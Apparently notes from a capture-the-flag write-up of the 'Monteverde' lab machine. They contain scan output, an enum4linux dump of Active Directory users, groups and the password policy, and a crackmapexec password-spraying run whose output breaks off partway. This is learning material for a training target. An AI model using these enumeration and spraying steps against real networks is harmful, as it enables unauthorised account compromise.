Monteverde IP:10.10.10.172


rustscan:
Open 10.10.10.172:53
Open 10.10.10.172:88
Open 10.10.10.172:135
Open 10.10.10.172:139
Open 10.10.10.172:389
Open 10.10.10.172:445
Open 10.10.10.172:464
Open 10.10.10.172:593
Open 10.10.10.172:3269
Open 10.10.10.172:3268
Open 10.10.10.172:5985
Open 10.10.10.172:9389
Open 10.10.10.172:49667
Open 10.10.10.172:49673
Open 10.10.10.172:49674
Open 10.10.10.172:49676
Open 10.10.10.172:49697


nmap:
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-03-28 11:22:23Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 10914/tcp): CLEAN (Timeout)
|   Check 2 (port 2859/tcp): CLEAN (Timeout)
|   Check 3 (port 47166/udp): CLEAN (Timeout)
|   Check 4 (port 56200/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-28T11:23:16
|_  start_date: N/A




enum4linux:

 enum4linux -v 10.10.10.172                                                                                                                                                                   1 ⨯
[V] Dependent program "nmblookup" found in /usr/bin/nmblookup
[V] Dependent program "net" found in /usr/bin/net
[V] Dependent program "rpcclient" found in /usr/bin/rpcclient
[V] Dependent program "smbclient" found in /usr/bin/smbclient
[V] Dependent program "polenum" found in /usr/bin/polenum
[V] Dependent program "ldapsearch" found in /usr/bin/ldapsearch
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Mar 28 07:17:00 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.172    |
 ==================================================== 
[V] Attempting to get domain name with command: nmblookup -A '10.10.10.172'
[E] Can't find workgroup/domain


 ============================================ 
|    Nbtstat Information for 10.10.10.172    |
 ============================================ 
Looking up status of 10.10.10.172
No reply from 10.10.10.172

 ===================================== 
|    Session Check on 10.10.10.172    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[V] Attempting to make null session using command: smbclient -W '' //'10.10.10.172'/ipc$ -U''%'' -c 'help' 2>&1
[+] Server 10.10.10.172 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 =========================================== 
|    Getting domain SID for 10.10.10.172    |
 =========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[V] Attempting to get domain SID with command: rpcclient -W '' -U''%'' 10.10.10.172 -c 'lsaquery' 2>&1
Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492
[+] Host is part of a domain (not a workgroup)

 ====================================== 
|    OS information on 10.10.10.172    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
[V] Attempting to get OS info with command: smbclient -W '' //'10.10.10.172'/ipc$ -U''%'' -c 'q' 2>&1
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.172 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[V] Attempting to get OS info with command: rpcclient -W '' -U''%'' -c 'srvinfo' '10.10.10.172' 2>&1
[+] Got OS info for 10.10.10.172 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================= 
|    Users on 10.10.10.172    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[V] Attempting to get userlist with command: rpcclient -W '' -c querydispinfo -U''%'' '10.10.10.172' 2>&1
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[V] Attempting to get userlist with command: rpcclient -W '' -c enumdomusers -U''%'' '10.10.10.172' 2>&1
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 ========================================= 
|    Share Enumeration on 10.10.10.172    |
 ========================================= 
[V] Attempting to get share list using authentication
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.172

 ==================================================== 
|    Password Policy Information for 10.10.10.172    |
 ==================================================== 
[V] Attempting to get Password Policy info with command: polenum '':''@'10.10.10.172' 2>&1


[+] Attaching to 10.10.10.172 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.172)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] MEGABANK
        [+] Builtin

[+] Password Info for Domain: MEGABANK

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
[V] Attempting to get Password Policy info with command: rpcclient -W '' -U''%'' '10.10.10.172' -c "getdompwinfo" 2>&1

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 7


 ============================== 
|    Groups on 10.10.10.172    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting builtin groups with command: rpcclient -W '' -U''%'' '10.10.10.172' -c 'enumalsgroups builtin' 2>&1

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Certificate Service DCOM Access' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Pre-Windows 2000 Compatible Access' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Remote Management Users' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Terminal Server License Servers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Performance Log Users' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Access Control Assistance Operators' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Users' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Users' (RID: 545) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Remote Access Servers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'IIS_IUSRS' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Management Servers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Storage Replica Administrators' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Network Configuration Operators' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Windows Authorization Access Group' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Incoming Forest Trust Builders' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Guests' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Guests' (RID: 546) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Performance Monitor Users' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Cryptographic Operators' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Distributed COM Users' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Remote Desktop Users' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Event Log Readers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Hyper-V Administrators' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RDS Endpoint Servers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
[V] Getting local groups with command: rpcclient -W '' -U''%'' '10.10.10.172' -c 'enumalsgroups domain' 2>&1

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'DnsAdmins' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Allowed RODC Password Replication Group' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'RAS and IAS Servers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'SQLServer2005SQLBrowserUser$MONTEVERDE' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'ADSyncAdmins' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'ADSyncBrowse' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Denied RODC Password Replication Group' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'Cert Publishers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'ADSyncPasswordSet' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
[V] Running command: net rpc group members 'ADSyncOperators' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
[V] Getting domain groups with command: rpcclient -W '' -U''%'' '10.10.10.172' -c "enumdomgroups" 2>&1

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Users' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Reception' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Protected Users' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Computers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Call Recording Admins' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Cloneable Domain Controllers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Developers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Enterprise Read-only Domain Controllers' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'DnsUpdateProxy' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Trading' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Group Policy Creator Owners' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'HelpDesk' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Domain Guests' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'File Server Admins' -W '' -I '10.10.10.172' -U''%'' 2>&1

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Azure Admins' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
[V] Running command: net rpc group members 'Operations' -W '' -I '10.10.10.172' -U''%'' 2>&1

Group 'Operations' (RID: 2609) has member: MEGABANK\smorgan

 ======================================================================= 
|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[V] Attempting to get SID from 10.10.10.172 with command: rpcclient -W '' -U''%'' '10.10.10.172' -c 'lookupnames administrator' 2>&1
[V] Assuming that user "administrator" exists
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[V] Attempting to get SIDs from 10.10.10.172 with command: rpcclient -W '' -U''%'' '10.10.10.172' -c lsaenumsid 2>&1

 ============================================= 
|    Getting printer info for 10.10.10.172    |
 ============================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
[V] Attempting to get printer info with command: rpcclient -W '' -U''%'' -c 'enumprinters' '10.10.10.172' 2>&1
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Mar 28 07:18:52 2023


now that we have some users, we can try a passowrd spraying attack using a password list consisting of common passwords. we will add the usernames to the password list just in case there is someone who uses his username as password

a basic password list can be found here: https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt

we use crackmapexec for the attack:

└─$ crackmapexec smb 10.10.10.172 -u users -p passwords             
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:Password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:Password123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\Administrator:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:Password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:Password123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:svc-ata STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:dgalanos STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:roleary STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\krbtgt:smorgan STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:Password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:Welcome1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:Letmein1 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:Password123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:Letmein123 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
